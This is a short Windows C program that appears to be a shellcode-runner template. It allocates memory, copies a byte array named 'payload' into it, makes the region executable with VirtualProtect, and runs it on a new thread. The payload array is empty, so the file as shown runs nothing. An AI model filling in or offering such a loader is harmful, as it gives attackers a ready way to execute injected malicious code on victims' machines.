#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
  void * allocated_memory;
  BOOL virtualprotect_result;
  HANDLE thread_handle;
  DWORD oldprotect = 0;

  unsigned char payload[] = {

  };

  unsigned int payload_len = 0;

  allocated_memory = VirtualAlloc(0,
                                  payload_len,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE
                                  );

  RtlMoveMemory(allocated_memory, payload, payload_len);

  virtualprotect_result = VirtualProtect(allocated_memory,
                                         payload_len,
                                         PAGE_EXECUTE_READ,
                                         &oldprotect);

  if ( virtualprotect_result != 0 ) {
    thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) allocated_memory, 0, 0, 0);
    WaitForSingleObject(thread_handle, -1);
  }

  return 0;
}
